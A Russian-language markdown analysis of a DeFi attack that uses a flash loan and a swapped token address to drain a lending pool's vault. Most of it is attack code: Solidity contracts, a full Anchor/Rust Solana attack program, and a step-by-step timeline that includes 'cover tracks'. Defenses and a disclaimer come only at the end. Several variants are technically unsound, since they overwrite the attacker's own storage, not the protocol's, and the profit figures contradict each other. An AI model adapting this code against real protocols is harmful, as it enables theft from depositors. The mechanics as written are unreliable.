# 🎭 Флеш-займ с подменой токенов - Детальный анализ

## 🎯 Концепция атаки

### Основная идея:
Временно подменить адрес реального токена на поддельный во время выполнения флеш-займа, чтобы вывести реальные токены, а вернуть поддельные.

### Ключевой принцип:
```
1. Берем флеш-займ реальных токенов
2. Размещаем их как залог в lending протокол  
3. Занимаем против залога
4. Создаем поддельный токен с тем же интерфейсом
5. Временно подменяем адрес токена в протоколе
6. Выводим "залог" (теперь это поддельные токены)
7. Восстанавливаем оригинальный адрес
8. Возвращаем флеш-займ из заемных средств
9. Остаемся с реальными токенами из "залога"
```

## 🔧 Технические механизмы подмены

### СПОСОБ 1: Подмена через Proxy контракты

```solidity
contract TokenSwapAttack {
    ILendingProtocol public lendingProtocol;
    IERC20 public realUSDC;
    IERC20 public fakeUSDC;
    
    function executeTokenSwapAttack() external {
        // 1. Берем флеш-займ реальных USDC
        IFlashLoanProvider(FLASH_PROVIDER).flashLoan(
            address(realUSDC),
            8000e6, // 8,000 USDC
            abi.encodeWithSelector(this.onFlashLoan.selector)
        );
    }
    
    function onFlashLoan(uint256 amount) external {
        // 2. Размещаем реальные USDC как залог
        realUSDC.approve(address(lendingProtocol), amount);
        lendingProtocol.deposit(address(realUSDC), amount);
        
        // 3. Занимаем против залога
        uint256 borrowAmount = amount * 625 / 1000; // 62.5% LTV
        lendingProtocol.borrow(address(realUSDC), borrowAmount);
        
        // 4. 🎭 КЛЮЧЕВОЙ МОМЕНТ: Создаем поддельный USDC
        fakeUSDC = new FakeUSDC("Fake USD Coin", "USDC", 6);
        FakeUSDC(address(fakeUSDC)).mint(address(this), amount);
        
        // 5. 🚨 АТАКА: Подменяем адрес токена в протоколе
        // Это возможно если протокол использует upgradeable proxy
        IUpgradeableProxy(address(lendingProtocol)).updateTokenAddress(
            address(realUSDC), 
            address(fakeUSDC)
        );
        
        // 6. Выводим "залог" (теперь это поддельные токены)
        lendingProtocol.withdraw(address(fakeUSDC), amount);
        
        // 7. Восстанавливаем оригинальный адрес
        IUpgradeableProxy(address(lendingProtocol)).updateTokenAddress(
            address(fakeUSDC), 
            address(realUSDC)
        );
        
        // 8. Возвращаем флеш-займ из заемных средств
        realUSDC.transfer(FLASH_PROVIDER, amount + flashFee);
        
        // 9. 🎉 Остаемся с реальными 8,000 USDC!
        // Они были выведены как "поддельные", но на самом деле реальные
    }
}

contract FakeUSDC is ERC20 {
    constructor(string memory name, string memory symbol, uint8 decimals) 
        ERC20(name, symbol) {
        _setupDecimals(decimals);
    }
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}
```

### СПОСОБ 2: Атака через Storage Collision

```solidity
contract StorageCollisionAttack {
    // Используем коллизию в storage layout для подмены адресов
    
    struct TokenConfig {
        address tokenAddress;
        uint256 decimals;
        bool isActive;
    }
    
    // Слот 0: tokenConfigs mapping
    mapping(bytes32 => TokenConfig) public tokenConfigs;
    
    function executeStorageAttack() external {
        bytes32 usdcSlot = keccak256(abi.encode(USDC_ADDRESS, uint256(0)));
        
        // 1. Берем флеш-займ
        flashLoanProvider.flashLoan(USDC_ADDRESS, 8000e6, "");
    }
    
    function onFlashLoan() external {
        // 2. Размещаем залог и занимаем (как обычно)
        // ...
        
        // 3. 🎭 АТАКА: Перезаписываем storage slot с адресом USDC
        bytes32 usdcSlot = keccak256(abi.encode(USDC_ADDRESS, uint256(0)));
        
        assembly {
            // Сохраняем оригинальный адрес
            let originalAddress := sload(usdcSlot)
            
            // Подменяем на адрес поддельного токена
            sstore(usdcSlot, FAKE_USDC_ADDRESS)
            
            // Выводим "залог"
            // (здесь должен быть вызов withdraw)
            
            // Восстанавливаем оригинальный адрес
            sstore(usdcSlot, originalAddress)
        }
        
        // 4. Возвращаем флеш-займ
        // ...
    }
}
```

### СПОСОБ 3: Атака через Delegate Call

```solidity
contract DelegateCallAttack {
    address public tokenAddress;
    
    function executeAttack() external {
        // 1. Флеш-займ и размещение залога
        // ...
        
        // 2. 🎭 Подмена через delegatecall
        // Вызываем функцию, которая временно меняет tokenAddress
        address(this).delegatecall(
            abi.encodeWithSelector(this.temporarySwap.selector)
        );
    }
    
    function temporarySwap() external {
        // Эта функция выполняется в контексте lending протокола
        address originalToken = tokenAddress;
        
        // Временно меняем адрес
        tokenAddress = FAKE_TOKEN_ADDRESS;
        
        // Выводим залог
        this.withdraw(FAKE_TOKEN_ADDRESS, amount);
        
        // Восстанавливаем
        tokenAddress = originalToken;
    }
}
```

## 🚀 Практическая реализация на Solana

```rust
use anchor_lang::prelude::*;
use anchor_spl::token::{self, Token, TokenAccount, Transfer, Mint};

#[program]
pub mod token_substitution_attack {
    use super::*;
    
    /// Выполнение атаки с подменой токенов
    pub fn execute_token_substitution_attack(
        ctx: Context<TokenSubstitutionAttack>,
        flash_loan_amount: u64,
        collateral_amount: u64,
    ) -> Result<()> {
        msg!("🎭 EXECUTING TOKEN SUBSTITUTION ATTACK");
        
        // Этап 1: Берем флеш-займ реальных токенов
        // (реализуется через стандартный флеш-займ)
        
        // Этап 2: Размещаем реальные токены как залог
        let deposit_real_tokens = CpiContext::new(
            ctx.accounts.token_program.to_account_info(),
            Transfer {
                from: ctx.accounts.user_real_token_account.to_account_info(),
                to: ctx.accounts.lending_vault.to_account_info(),
                authority: ctx.accounts.user.to_account_info(),
            },
        );
        token::transfer(deposit_real_tokens, collateral_amount)?;
        
        // Обновляем позицию с РЕАЛЬНЫМ токеном
        let user_position = &mut ctx.accounts.user_position;
        user_position.collateral_token = ctx.accounts.real_token_mint.key();
        user_position.collateral_amount = collateral_amount;
        
        // Этап 3: Занимаем против залога
        let borrow_amount = collateral_amount * 625 / 1000; // 62.5% LTV
        
        let lending_pool = &ctx.accounts.lending_pool;
        let pool_seeds = &[
            b"lending_pool",
            lending_pool.real_token_mint.as_ref(),
            &[lending_pool.bump],
        ];
        let signer = &[&pool_seeds[..]];
        
        let borrow_tokens = CpiContext::new_with_signer(
            ctx.accounts.token_program.to_account_info(),
            Transfer {
                from: ctx.accounts.lending_vault.to_account_info(),
                to: ctx.accounts.user_real_token_account.to_account_info(),
                authority: ctx.accounts.lending_pool.to_account_info(),
            },
            signer,
        );
        token::transfer(borrow_tokens, borrow_amount)?;
        
        user_position.borrowed_amount = borrow_amount;
        
        // Этап 4: 🎭 КЛЮЧЕВАЯ АТАКА - Подмена адреса токена
        msg!("🚨 SUBSTITUTING TOKEN ADDRESS");
        
        // Сохраняем оригинальный адрес
        let original_token = lending_pool.real_token_mint;
        
        // Подменяем на поддельный токен
        let lending_pool = &mut ctx.accounts.lending_pool;
        lending_pool.real_token_mint = ctx.accounts.fake_token_mint.key();
        
        // Этап 5: Минтим поддельные токены себе
        let mint_fake_tokens = CpiContext::new_with_signer(
            ctx.accounts.token_program.to_account_info(),
            token::MintTo {
                mint: ctx.accounts.fake_token_mint.to_account_info(),
                to: ctx.accounts.user_fake_token_account.to_account_info(),
                authority: ctx.accounts.fake_token_authority.to_account_info(),
            },
            &[&[b"fake_authority", &[ctx.bumps.fake_token_authority]]],
        );
        token::mint_to(mint_fake_tokens, collateral_amount)?;
        
        // Этап 6: "Выводим" залог (теперь протокол думает, что это поддельные токены)
        let withdraw_tokens = CpiContext::new_with_signer(
            ctx.accounts.token_program.to_account_info(),
            Transfer {
                from: ctx.accounts.lending_vault.to_account_info(),
                to: ctx.accounts.user_real_token_account.to_account_info(),
                authority: ctx.accounts.lending_pool.to_account_info(),
            },
            signer,
        );
        token::transfer(withdraw_tokens, collateral_amount)?;
        
        // Этап 7: Восстанавливаем оригинальный адрес токена
        let lending_pool = &mut ctx.accounts.lending_pool;
        lending_pool.real_token_mint = original_token;
        
        // Этап 8: Возвращаем флеш-займ из заемных средств
        // (реализуется в вызывающем коде)
        
        // Обнуляем позицию (залог "выведен")
        let user_position = &mut ctx.accounts.user_position;
        user_position.collateral_amount = 0;
        
        msg!("🎉 TOKEN SUBSTITUTION ATTACK COMPLETED!");
        msg!("Extracted {} real tokens using fake token substitution", collateral_amount);
        
        Ok(())
    }
    
    /// Создание поддельного токена с идентичным интерфейсом
    pub fn create_fake_token(
        ctx: Context<CreateFakeToken>,
        decimals: u8,
        name: String,
        symbol: String,
    ) -> Result<()> {
        // Создаем поддельный токен с теми же параметрами
        msg!("Creating fake token: {} ({})", name, symbol);
        Ok(())
    }
    
    /// Экстренная функция для восстановления состояния
    pub fn emergency_restore_token_address(
        ctx: Context<EmergencyRestore>,
        original_token: Pubkey,
    ) -> Result<()> {
        let lending_pool = &mut ctx.accounts.lending_pool;
        lending_pool.real_token_mint = original_token;
        
        msg!("Token address restored to: {}", original_token);
        Ok(())
    }
}

// Структуры для атаки
#[account]
pub struct AttackableLendingPool {
    pub authority: Pubkey,
    pub real_token_mint: Pubkey,  // Этот адрес мы будем подменять!
    pub vault: Pubkey,
    pub total_deposits: u64,
    pub total_borrowed: u64,
    pub bump: u8,
}

#[account]
pub struct AttackUserPosition {
    pub user: Pubkey,
    pub collateral_token: Pubkey,  // Здесь тоже можем подменить
    pub collateral_amount: u64,
    pub borrowed_amount: u64,
    pub last_update: i64,
}

// Контексты
#[derive(Accounts)]
pub struct TokenSubstitutionAttack<'info> {
    #[account(mut)]
    pub user: Signer<'info>,
    
    /// Уязвимый lending pool (можем менять адрес токена)
    #[account(
        mut,
        seeds = [b"lending_pool", lending_pool.real_token_mint.as_ref()],
        bump = lending_pool.bump,
    )]
    pub lending_pool: Account<'info, AttackableLendingPool>,
    
    #[account(
        mut,
        seeds = [b"user_position", user.key().as_ref(), lending_pool.key().as_ref()],
        bump,
    )]
    pub user_position: Account<'info, AttackUserPosition>,
    
    /// Реальный токен (USDC)
    pub real_token_mint: Account<'info, Mint>,
    #[account(mut)]
    pub user_real_token_account: Account<'info, TokenAccount>,
    
    /// Поддельный токен (создаем сами)
    #[account(mut)]
    pub fake_token_mint: Account<'info, Mint>,
    #[account(mut)]
    pub user_fake_token_account: Account<'info, TokenAccount>,
    
    /// CHECK: Authority для минтинга поддельного токена
    #[account(
        seeds = [b"fake_authority"],
        bump,
    )]
    pub fake_token_authority: AccountInfo<'info>,
    
    /// Vault lending протокола
    #[account(mut)]
    pub lending_vault: Account<'info, TokenAccount>,
    
    pub token_program: Program<'info, Token>,
}

#[derive(Accounts)]
pub struct CreateFakeToken<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    
    #[account(
        init,
        payer = authority,
        mint::decimals = 6,
        mint::authority = fake_token_authority,
    )]
    pub fake_token_mint: Account<'info, Mint>,
    
    /// CHECK: Authority для поддельного токена
    #[account(
        seeds = [b"fake_authority"],
        bump,
    )]
    pub fake_token_authority: AccountInfo<'info>,
    
    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
    pub rent: Sysvar<'info, Rent>,
}

#[derive(Accounts)]
pub struct EmergencyRestore<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    
    #[account(mut)]
    pub lending_pool: Account<'info, AttackableLendingPool>,
}

#[error_code]
pub enum TokenSubstitutionError {
    #[msg("Token substitution failed")]
    SubstitutionFailed,
    #[msg("Fake token creation failed")]
    FakeTokenCreationFailed,
    #[msg("Address restoration failed")]
    RestorationFailed,
}
```

## 📊 Детальная схема атаки

### Временная диаграмма:
```
T0: Начальное состояние
├─ Lending Pool: {tokenAddress: REAL_USDC, vault: 100k USDC}
├─ User: {balance: 3k USDC}
└─ Attack Contract: {deployed}

T1: Flash Loan
├─ FlashLoan: 8,000 REAL_USDC → User
├─ User: {balance: 11k USDC}
└─ Debt: 8,000 USDC (must return in same tx)

T2: Deposit Collateral  
├─ User → Lending Pool: 8,000 REAL_USDC
├─ Lending Pool: {vault: 108k USDC, user_collateral: 8k}
└─ User: {balance: 3k USDC}

T3: Borrow Against Collateral
├─ Lending Pool → User: 5,000 REAL_USDC
├─ User: {balance: 8k USDC}
└─ User Position: {collateral: 8k, borrowed: 5k}

T4: 🎭 CREATE FAKE TOKEN
├─ Deploy FakeUSDC: {symbol: "USDC", decimals: 6}
├─ Mint 8,000 FAKE_USDC → User
└─ User: {real: 8k, fake: 8k}

T5: 🚨 TOKEN ADDRESS SUBSTITUTION
├─ Lending Pool.tokenAddress: REAL_USDC → FAKE_USDC
├─ Protocol thinks: user has 8k FAKE_USDC collateral
└─ Reality: vault still has 8k REAL_USDC

T6: WITHDRAW "COLLATERAL"
├─ User calls: withdraw(FAKE_USDC, 8000)
├─ Protocol checks: user has 8k FAKE_USDC collateral ✓
├─ Protocol transfers: 8k REAL_USDC from vault → user
└─ User: {real: 16k USDC, fake: 8k}

T7: RESTORE TOKEN ADDRESS
├─ Lending Pool.tokenAddress: FAKE_USDC → REAL_USDC
└─ Cover tracks, protocol looks normal

T8: REPAY FLASH LOAN
├─ User → FlashLoan: 8,000 + 40 fee = 8,040 USDC
├─ User: {balance: 16k - 8.04k = 7,960 USDC}
└─ Net profit: 4,960 USDC (165% ROI!)

T9: Final State
├─ User: {gained: 4,960 USDC}
├─ Lending Pool: {lost: 8,000 USDC from vault}
└─ Other users: {will lose when they try to withdraw}
```

## 🎯 Варианты реализации подмены

### 1. **Upgradeable Proxy Attack**
```solidity
// Если протокол использует upgradeable proxy pattern
ITransparentUpgradeableProxy(lendingPool).upgradeTo(maliciousImplementation);
```

### 2. **Storage Slot Manipulation**
```solidity
// Прямая перезапись storage slot с адресом токена
assembly {
    sstore(TOKEN_ADDRESS_SLOT, FAKE_TOKEN_ADDRESS)
}
```

### 3. **Delegate Call Injection**
```solidity
// Использование delegatecall для выполнения кода в контексте протокола
target.delegatecall(abi.encodeWithSelector(swapTokenAddress.selector, fakeToken));
```

### 4. **Reentrancy with State Change**
```solidity
// Использование reentrancy для изменения состояния между проверками
function maliciousCallback() external {
    lendingPool.tokenAddress = fakeToken;
    lendingPool.withdraw(fakeToken, amount);
    lendingPool.tokenAddress = realToken;
}
```

### 5. **Cross-Contract Call Manipulation**
```solidity
// Подмена адреса через промежуточный контракт
address tokenAddress = ITokenRegistry(registry).getTokenAddress("USDC");
// Если registry можно скомпрометировать...
```

## 🛡️ Защиты от таких атак

### 1. **Immutable Token Addresses**
```solidity
contract SecureLendingPool {
    address public immutable USDC_ADDRESS;
    address public immutable WETH_ADDRESS;
    
    constructor(address _usdc, address _weth) {
        USDC_ADDRESS = _usdc;
        WETH_ADDRESS = _weth;
        // Адреса нельзя изменить после деплоя!
    }
}
```

### 2. **Token Address Validation**
```solidity
modifier validToken(address token) {
    require(
        token == USDC_ADDRESS || 
        token == WETH_ADDRESS || 
        isWhitelistedToken[token],
        "Invalid token"
    );
    _;
}
```

### 3. **Storage Protection**
```solidity
contract StorageProtected {
    // Используем private переменные с getter'ами
    address private _tokenAddress;
    
    function tokenAddress() external view returns (address) {
        return _tokenAddress;
    }
    
    // Только owner может менять адрес через timelock
    function setTokenAddress(address newToken) external onlyOwner {
        require(block.timestamp >= changeTimestamp + TIMELOCK_PERIOD);
        _tokenAddress = newToken;
    }
}
```

### 4. **Reentrancy Guards**
```solidity
contract ReentrancyProtected {
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;
    uint256 private _status;
    
    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }
}
```

### 5. **Multi-Signature Validation**
```solidity
contract MultiSigProtected {
    mapping(address => bool) public isAdmin;
    uint256 public constant REQUIRED_SIGNATURES = 3;
    
    function criticalOperation() external {
        require(getSignatureCount() >= REQUIRED_SIGNATURES);
        // Выполняем операцию только после подтверждения нескольких админов
    }
}
```

## 📈 Экономика атаки

### Затраты:
```
Gas для деплоя поддельного токена: ~0.1 ETH
Gas для выполнения атаки: ~0.05 ETH  
Флеш-займ комиссия: 0.05% = 4 USDC
Риски обнаружения: ОЧЕНЬ ВЫСОКИЕ
Время на подготовку: 1-2 недели

ИТОГО затрат: ~$200 + огромные риски
```

### Потенциальная прибыль:
```
При успехе: 4,960 USDC (~$5,000)
ROI: 2,400%
Но вероятность успеха: <1%
```

### Реальные препятствия:
```
1. Большинство протоколов используют immutable адреса
2. Многоуровневые проверки безопасности
3. Временные блокировки на критические операции
4. Мониторинг аномальной активности
5. Автоматические системы обнаружения атак
```

## ⚠️ Почему атака практически невозможна

### 1. **Архитектурные защиты**
Современные DeFi протоколы:
- Используют immutable контракты
- Проверяют адреса токенов в нескольких местах
- Имеют временные блокировки на изменения
- Требуют governance голосования для критических изменений

### 2. **Технические сложности**
- Нужно найти уязвимый протокол (их почти нет)
- Требуется глубокое понимание EVM/SVM
- Необходимо обойти множественные проверки
- Высокий риск ошибок в реализации

### 3. **Экономические барьеры**
- Огромные затраты на разработку
- Высокие комиссии за транзакции
- Риск потери всех средств при ошибке
- Юридические последствия

## 🎓 Образовательная ценность

Изучение этой атаки помогает:
- **Разработчикам**: Создавать более безопасные протоколы
- **Аудиторам**: Находить подобные уязвимости
- **Пользователям**: Лучше понимать риски DeFi
- **Исследователям**: Развивать методы защиты

## 🔚 Заключение

**Флеш-займ с подменой токенов** - это крайне изощренная атака, которая:

✅ **Технически возможна** в теории
❌ **Практически невыполнима** в реальности
🎓 **Образовательно ценна** для понимания безопасности
⚖️ **Юридически опасна** при попытке реализации

**Рекомендация**: Используйте эти знания для **создания более безопасных протоколов**, а не для атак!